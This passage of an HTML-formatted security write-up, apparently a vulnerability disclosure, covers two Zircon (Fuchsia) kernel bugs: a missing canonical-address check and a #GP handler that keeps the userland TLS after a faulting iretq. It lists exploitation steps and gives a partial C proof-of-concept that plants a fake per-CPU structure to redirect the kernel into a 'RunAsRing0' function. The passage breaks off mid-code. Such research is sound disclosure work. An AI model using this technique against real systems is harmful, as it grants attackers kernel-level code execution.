&lt;p&gt;The &lt;tt class=&quot;docutils literal&quot;&gt;#GP&lt;/tt&gt; handler must be careful to switch back to the kernel TLS before continuing.&lt;/p&gt;
&lt;p&gt;Two bugs were noticed on Fuchsia:&lt;/p&gt;
&lt;ol class=&quot;arabic simple&quot;&gt;&lt;li&gt;Zircon does not verify that the return addresses are canonical when returning from an interrupt or exception handler.&lt;/li&gt;
&lt;li&gt;Zircon does not handle correctly the &lt;tt class=&quot;docutils literal&quot;&gt;iretq&lt;/tt&gt;-generated faults, and doesn't restore the kernel TLS in the &lt;tt class=&quot;docutils literal&quot;&gt;#GP&lt;/tt&gt; handler.&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;The combination of the two means that it is possible to make &lt;tt class=&quot;docutils literal&quot;&gt;iretq&lt;/tt&gt; fault in the kernel, and to have the fault handler execute with the userland TLS!&lt;/p&gt;
&lt;div class=&quot;section&quot; id=&quot;the-tls-on-zircon&quot; readability=&quot;10&quot;&gt;
&lt;h4&gt;The TLS on Zircon&lt;/h4&gt;
&lt;p&gt;The kernel TLS on Zircon is a &lt;tt class=&quot;docutils literal&quot;&gt;x86_percpu&lt;/tt&gt; structure, which contains useful fields for code execution, such as &lt;tt class=&quot;docutils literal&quot;&gt;gpf_return_target&lt;/tt&gt; (as we will see below).&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;section&quot; id=&quot;exploitation&quot; readability=&quot;38.017601431981&quot;&gt;
&lt;h4&gt;Exploitation&lt;/h4&gt;
&lt;p&gt;The steps of the exploitation are the following:&lt;/p&gt;
&lt;ol class=&quot;arabic simple&quot;&gt;&lt;li&gt;Create a thread. The thread must not do anything (infinite loop for example).&lt;/li&gt;
&lt;li&gt;Suspend this thread with the &lt;tt class=&quot;docutils literal&quot;&gt;zx_task_suspend()&lt;/tt&gt; syscall.&lt;/li&gt;
&lt;li&gt;Use &lt;tt class=&quot;docutils literal&quot;&gt;zx_thread_write_state()&lt;/tt&gt; to change the &lt;tt class=&quot;docutils literal&quot;&gt;%rip&lt;/tt&gt; register of the suspended thread, and put a non-canonical value in it, such as &lt;tt class=&quot;docutils literal&quot;&gt;0x00FFFFFFFFFFFFFF&lt;/tt&gt;. Also change the value of &lt;tt class=&quot;docutils literal&quot;&gt;gs.base&lt;/tt&gt; to a specific value that we will call &lt;tt class=&quot;docutils literal&quot;&gt;FakeTlsAddr&lt;/tt&gt;.&lt;/li&gt;
&lt;li&gt;Use the &lt;tt class=&quot;docutils literal&quot;&gt;zx_handle_close()&lt;/tt&gt; syscall to resume the suspended thread.&lt;/li&gt;
&lt;li&gt;When the thread resumes, the kernel will return to it; it will execute &lt;tt class=&quot;docutils literal&quot;&gt;swapgs&lt;/tt&gt; (to install the userland &lt;tt class=&quot;docutils literal&quot;&gt;gs.base&lt;/tt&gt; value), and then &lt;tt class=&quot;docutils literal&quot;&gt;iretq&lt;/tt&gt;, which will fault because the &lt;tt class=&quot;docutils literal&quot;&gt;%rip&lt;/tt&gt; value we set is non-canonical. The kernel ends up in the &lt;tt class=&quot;docutils literal&quot;&gt;#GP&lt;/tt&gt; fault handler.&lt;/li&gt;
&lt;li&gt;The &lt;tt class=&quot;docutils literal&quot;&gt;#GP&lt;/tt&gt; handler sees that the fault was received in the kernel, and does not execute &lt;tt class=&quot;docutils literal&quot;&gt;swapgs&lt;/tt&gt; because it thinks that since we came from the kernel then we must have the kernel TLS loaded. The handler therefore wrongfully stays with the userland &lt;tt class=&quot;docutils literal&quot;&gt;gs.base&lt;/tt&gt; value. It then calls the &lt;tt class=&quot;docutils literal&quot;&gt;x86_exception_handler()&lt;/tt&gt; function.&lt;/li&gt;
&lt;li&gt;&lt;tt class=&quot;docutils literal&quot;&gt;x86_exception_handler()&lt;/tt&gt; uses this TLS. In particular, it will quickly exit if the &lt;tt class=&quot;docutils literal&quot;&gt;gpf_return_target&lt;/tt&gt; field of the TLS is non-zero, and it will actually jump into this address!&lt;/li&gt;
&lt;li&gt;The CPU jumps into &lt;tt class=&quot;docutils literal&quot;&gt;gpf_return_target&lt;/tt&gt; with kernel privileges.&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;In the end, the kernel uses the structure located at &lt;tt class=&quot;docutils literal&quot;&gt;FakeTlsAddr&lt;/tt&gt; thinking it is a trusted &lt;tt class=&quot;docutils literal&quot;&gt;x86_percpu&lt;/tt&gt; structure from the kernel whereas it is actually a structure possibly controlled by userland. By placing a specific value in the &lt;tt class=&quot;docutils literal&quot;&gt;gpf_return_target&lt;/tt&gt; field of this fake structure, userland can begin to gain code execution in kernel mode.&lt;/p&gt;
&lt;p&gt;Userland must choose the &lt;tt class=&quot;docutils literal&quot;&gt;FakeTlsAddr&lt;/tt&gt; address so that it points to a kernel buffer where userland data got copied, or to a buffer in userland directly (if there is no &lt;tt class=&quot;docutils literal&quot;&gt;SMEP&lt;/tt&gt;/&lt;tt class=&quot;docutils literal&quot;&gt;SMAP&lt;/tt&gt;).&lt;/p&gt;
&lt;p&gt;As a toy example, we developed a simple exploit that relies on &lt;tt class=&quot;docutils literal&quot;&gt;SMEP&lt;/tt&gt;/&lt;tt class=&quot;docutils literal&quot;&gt;SMAP&lt;/tt&gt; not being present:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;30&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdint.h&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;pthread.h&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;zircon/syscalls.h&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;zircon/threads.h&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;zircon/process.h&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;zircon/syscalls/debug.h&amp;gt;&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;#define __aligned(x)    __attribute__((__aligned__(x)))&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#define __barrier()     __asm __volatile(&quot;&quot;:::&quot;memory&quot;)&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#define PAGE_SIZE       4096&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;volatile&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zx_handle_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MyThreadHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;volatile&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Ready&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;volatile&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Resume&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FakeThread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PAGE_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__aligned&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PAGE_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FakeUStack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PAGE_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__aligned&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PAGE_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;cm&quot;&gt;/*&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt; * Short, simplified version of &quot;struct x86_percpu&quot;. We are mainly interested&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt; * in &quot;gpf_return_target&quot; here, because it dictates where the #GP handler&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt; * returns. We make it point to a userland address.&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt; */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FakeCpu&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;direct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;current_thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;kt&quot;&gt;uintptr_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stack_guard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;kt&quot;&gt;uintptr_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel_unsafe_sp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;kt&quot;&gt;uintptr_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;saved_user_sp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;blocking_disallowed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;volatile&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;monitor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idle_states&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apic_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;kt&quot;&gt;uintptr_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gpf_return_target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FakeCpu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PAGE_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FakeTls&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__aligned&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PAGE_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;cm&quot;&gt;/* -------------------------------------------------------------------------- */&lt;/span&gt;

&lt;span class=&quot;cm&quot;&gt;/*&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt; * This function runs as ring0, with the context of MyThread(). Put whatever&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt; * you want in it, this basically executes as kernel code.&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt; */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;RunAsRing0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kr&quot;&gt;__asm&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;volatile&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
                &lt;span class=&quot;cm&quot;&gt;/* ... */&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;1: jmp 1b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;cm&quot;&gt;/*&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt; * Expose the handle of the thread. Kinda annoying to do, I didn't find a way&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt; * to retrieve that handle from the parent thread directly (the thing is hidden&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt; * inside pthread etc).&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt; */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;MyThread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[Thread] Started&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;MyThreadHandle&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zx_thread_self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;__barrier&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;Ready&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;__barrier&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Resume&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[Thread] Resumed&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;zx_thread_state_general_regs_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;regs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;zx_handle_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;zx_status_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pthread_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;thid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;pthread_create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;thid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MyThread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;cm&quot;&gt;/*&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;         * Wait for the handle to be exposed...&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;         */&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Ready&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[Main] Ready&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zx_task_suspend&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MyThreadHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ZX_OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[Main] zx_task_suspend failed: %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[Main] Suspended&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;FakeTls&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FakeCpu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;direct&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FakeTls&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;FakeTls&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FakeCpu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;current_thread&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FakeThread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;FakeTls&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FakeCpu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gpf_return_target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uintptr_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RunAsRing0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;FakeTls&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FakeCpu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kernel_unsafe_sp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uintptr_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FakeUStack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PAGE_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zx_thread_read_state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MyThreadHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ZX_THREAD_STATE_GENERAL_REGS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;regs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;regs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ZX_OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[Main] zx_thread_read_state failed: %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;regs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gs_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uintptr_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FakeTls&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* Our fake TLS */&lt;/span&gt;
